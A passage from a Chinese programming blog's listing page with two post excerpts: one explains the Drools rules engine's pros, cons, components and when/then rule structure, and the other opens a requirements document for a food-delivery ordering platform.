优劣 优点 声明式编程：规则引擎允许你说“做什么”，而不是“怎么做”。这样可以使得表达复杂问题的解决方案更容易，并且可以验证解决方案的正确性。规则比代码更容易阅读。业务逻辑的集中管理：规则引擎可以将业务逻辑从程序代码中分离出来，使得业务逻辑的维护和变更更快更便宜。同时，也可以缩小业务人员和技术人员之间的沟通鸿沟，因为规则可以用一种容易理解的格式编写。规则的复用和组合：规则引擎可以将规则分为不同的模块，根据不同的场景和需求进行复用和组合。这样可以提高规则的可扩展性和灵活性。 缺点 学习成本：开发人员需要学习一种新的编程方式，掌握规则引擎的基本概念和语法。同时，也需要了解规则引擎的内部工作原理，以便优化规则的性能和效率。调试困难：规则引擎的运行过程可能涉及到大量的规则匹配和推理，当出现错误或异常时，很难定位问题的原因和位置。此外，规则之间也可能存在冲突或循环，需要注意避免或解决。不适合简单或稳定的业务逻辑：如果一个应用中只有很少或没有变化的业务逻辑，使用规则引擎可能是一种过度设计，会增加不必要的复杂度和开销。在这种情况下，直接使用程序代码可能更合适。 基本概念 规则引擎（RE）是一种模块，可以自动化管理一些高度可变的过程。基本的概念是将参与过程的对象与实现这些过程的逻辑分离。逻辑是通过编写规则来定义的。
Drools规则引擎使用开源的Drools规则引擎，它使用了一种改进的Rete算法，并具有前向和后向链推理机制。
Fact：事实，是指在drools规则应用当中，将一个普通的Java Bean插入到Working Memory后的对象就是Fact对象。
规则引擎构成 由以下三部分组成：
Working Memory（工作内存）：规则引擎会从Working Memory中获取数据并和规则文件中定义的规则进行模式匹配，应用程序需要将数据插入到Working Memory中。Rule Base（规则库）：在规则文件中定义的规则都会被加载到规则库中。Inference Engine（推理引擎） 其中Inference Engine（推理引擎）又包括：
Patter Matcher（匹配器）：将Rule Base中所有规则与Working Memory中的Fact对象进行模式匹配，匹配成功的规则将被激活放入Agenda。Agenda（议程）：用于存放通过匹配器进行模式匹配后被激活的规则。Execution Engine（执行引擎）
规则结构 Drools规则引擎有自己的语法来编写规则，这种语法是声明式、简洁和明确的。一个规则有以下结构：
when 条件
条件是根据一定的语法规则来编辑的。根据这种语法，设置一个条件意味着验证一个事实。应用规则的上下文由一组事实组成，这些事实描述了RE操作的当前情况，并被断言在一个工作内存中。为了判断是否应用一个规则，RE验证一个事实是否在工作内存中被有效地断言。如果是，那么规则就被应用。then 动作
动作区域是用普通的Java代码来编辑的，包含了如果条件被验证要执行的动作。要应用的规则被包含在一个生产内存中。RE比较生产内存中假设的动作和工作内存中断言的事实。如果有兼容性，RE执行一个或多个规则。 简单来说，Drools规则就是根据when后的条件来匹配工作内存中的事实，如果匹配成功，就执行then后的动作。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59f649939c207fb8f46cea860606cb54/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9b6358b7480379dcac99d646c3ee367d/" rel="bookmark">
			外卖平台的设计与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1.1 问题描述 近年来，在我国大力扶持互联网+的发展，互联网也已基本入户人名群众，成为现代人日常生活不可或缺的一部分。与此同时，网络订餐也借此政策不断蓬勃发展。外卖平台是近年来快速发展的一种新型电商平台，随着移动互联网和在线支付技术的普及，外卖平台已经成为人们生活中不可或缺的一部分。外卖平台通过线上点餐、在线支付和配送等服务，为消费者提供了更加便捷、高效和舒适的就餐体验，也为餐饮企业提供了更为广阔的发展空间和商机。目前涌现出来的外卖网络订餐平台有美团，饿了么，KFC宅急送，百度外卖等。在网络上订餐的优势就是便捷和直观，大众可以在丰富的页面上挑选自己喜欢的菜式，同时有了互联网的加持，聚合了附近多家食品店铺的信息，使大众有了更多的选择，也让店家有了更多的生意，促进店铺的发展，同时也让大众能足不出户的情况下，吃到附近的美食，更加的便捷。
在外卖平台快速发展的背景下，如何设计和实现一个高效、稳定、安全、易用的外卖平台，成为业内关注的焦点。在这个背景下，研究外卖平台的设计与实现，对于推动外卖行业的发展、提高用户体验、提高平台运营效率具有重要的意义。
1.2 项目目标 根据2015年国务院总理李克强在《政府工作报告》中提出的“互联网+行动计划”这个论述，从此“互联网+行业”便层出不穷，其中就包括“互联网+餐饮”。在2020年出，全球遭受新冠肺炎，在此影响下，我国网民呈现大幅度上升。据调查报告显示，到目前2020年3月，我国的网民数量已经突破9亿，占了总人口的四分之三。目前我国外卖行业呈现井喷式发展，包括成熟的即时的配送业务、时间效率的不断提高、外卖的优惠力度越来越大且普及范围越来越广。同时在疫情的刺激下，我们的台就抓住了这个时机，大力宣传外卖的好处，同时也推动了外卖行业的发展，因此，在未来很长一段时间里，网络订餐会成为餐饮行业的重要的中坚力量，外卖将成为关键一步。
本系统主要是用于解决在点餐中存在的问题，对需要改进的地方进行系统分析，使点餐的操作过程更简单更流畅。
1.3 项目适用范围 该产品适用于中小型商家提供给顾客点餐服务，同时也适用于需要点餐的顾客，使用该点餐小程序可以更方便快捷的进行点餐。
1.4 涉众 系统设计人员：清晰的描述一个外卖系统的整体规划、模块化设计方案，在保证稳定性的情况下提高可扩展性。
系统开发人员：开发出一整套系统并且完成所有功能的测试。
中小型商家：提供尽可能多的菜品。
个人用户：方便快捷的进行点餐。
2.1 业务需求 2.1.1 业务流程 外卖平台是将外卖点餐通过网络网站和APP将传统管理方式转换为在线上管理，方便快捷地完成外卖业务，并给予安全性保障。以下将展示管理者的部分使用功能、用户的使用的功能。外卖平台系统的总体业务流程如图2.1所示。
图2.1 总体流程图
2.1.2 业务对象 本系统具有两种权限：用户和管理员。管理员登录系统后台后可以使用所有功能，管理员的功能是最高的，可以对系统所在功能进行查看，修改和删除，包括用户的功能。用户使用前端小程序可以选择相关菜品，套餐下单，添加收货地址等功能。具体来说，这些业务对象需要在外卖平台上进行注册和登录，通过与平台交互进行信息的增删改查、订单处理、支付等操作。平台需要为这些业务对象提供相应的功能。业务对象和功能可以通过系统设计和实现来实现外卖平台的顺畅交互和高效运营，提高用户满意度、商家参与度和骑手配送效率，协助外卖平台实现商业目标。领域模型图如图2.2所示。
图2.2 领域模型图
2.2 功能性需求 2.2.1 用例概述 外卖平台管理系统可以将功能划分为管理员的使用功能和用户使用的功能。系统用例图如图2.3所示。
图2.3 系统用例图
用例图中包含了系统主要用例，是系统功能的概述。用例摘要描述如表2.1所示。
表2.1 用例摘要描述
用例标识（UC）
用例名称
摘要描述
1
注册
用户进行注册，申请系统使用权限。
2
登录系统
用户可以通过账号密码登录系统。
3
个人中心
用户可以通过前端程序更改自己的相关信息。
4
订单信息
用户通过程序进行下单并查看自己的订单。
5
订单管理
管理员可以对订单进行管理。
6
菜品管理
管理员可以添加菜品信息。
7
套餐管理
管理员可以管理套餐信息
8
数据管理
管理员在数据管理管理用户数据，营业数据，订单数据等。
9
用户管理
管理员可以对用户进行管理。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9b6358b7480379dcac99d646c3ee367d/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/127/">«</a>
	<span class="pagination__item pagination__item--current">128/489</span>
	<a class="pagination__item pagination__item--next btn" href="/page/129/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>